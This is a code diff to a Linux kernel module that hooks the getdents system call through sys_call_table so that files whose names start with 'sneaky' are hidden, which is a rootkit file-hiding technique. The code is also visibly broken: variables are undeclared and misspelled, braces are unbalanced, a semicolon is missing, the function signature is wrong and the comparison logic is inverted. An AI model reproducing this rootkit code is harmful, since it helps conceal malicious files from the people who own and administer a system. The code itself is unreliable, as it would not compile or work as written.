@@ -4,6 +4,7 @@
 #include <linux/unistd.h>
 #include <linux/syscalls.h>
 #include <linux/kallsyms.h>
+#include <linux/string.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Yann KOETH");
@@ -12,13 +13,39 @@ MODULE_VERSION("0.1");
 
 #define SYS_CALL_TABLE "sys_call_table"
 #define sys_getdents __NR_getdents
+#define sneak_phrase "sneaky"
 unsigned long* syscall_table;
+struct linux_dirent{
+  unsigned long d_ino;
+  unsigned long d_off;
+  unsigned short d_reclen;
+  char d_name[];
+
+}
 
 asmlinkage int (*originalGetDents) (unsigned int fd, struct linux_dirent *dirp , unsigned int count);
 
-static asmlinkage long* hijackgetdents(void){
+    static asmlinkage long* hijackgetdents(void){
+    struct linux_dirent *hijackedDirent;
+    char* fileNames;
+    long original = originalGetDents(fd, dirp, count);
 
-return 0;
+    if (original<= 0){
+      return original;
+    }
+    hijackedBuffer= (char*)dirent;
+
+    int counter=0;
+    while(counter<original){
+        hijackedDirent=(struct linux_dirent*)(fileNames+counter);
+        if((strncmp(hijackedDirent->name,sneak_phrase, (sizeof(sneak_phrase)-1))))
+        memcpy(hijackedBuffer+counter, hijakcedBuffer+counter+hijackedDirent->d_reclen, original-(counter+hijackedDirent->d_reclen));
+    }
+      else{
+        counter = counter + hijackedDirent->d_reclen;
+      }
+
+return original;
 
 }
 
